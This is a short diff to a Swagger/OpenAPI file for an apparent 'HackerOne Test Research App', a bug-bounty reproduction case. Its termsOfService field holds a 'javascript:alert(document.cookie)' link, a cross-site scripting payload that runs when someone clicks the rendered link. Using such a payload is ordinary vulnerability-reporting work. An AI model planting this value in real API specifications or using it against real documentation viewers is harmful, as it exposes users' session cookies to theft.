@@ -1,7 +1,7 @@
-swagger: "2.0",
+swagger: "2.0"
 info: 
   title: "HackerOne Test Research App",
-  description: "To repro, select the ToS link."
+  description: "To repro, select the link."
   termsOfService: "javascript:alert(document.cookie)"
   contact: 
     name: "Test Contact",
